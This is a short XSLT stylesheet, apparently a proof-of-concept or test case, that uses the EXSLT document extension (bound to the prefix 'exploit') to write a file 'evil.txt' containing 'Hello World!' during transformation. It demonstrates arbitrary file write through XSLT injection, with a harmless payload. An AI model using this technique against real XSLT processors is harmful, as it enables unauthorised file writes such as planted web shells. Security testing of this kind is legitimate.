<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
        xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:exploit="http://exslt.org/common"
    extension-element-prefixes="exploit"
    version="1.0">
<xsl:template match="/">

<exploit:document href="evil.txt" method="text">
        Hello World!
</exploit:document>

</xsl:template>
</xsl:stylesheet>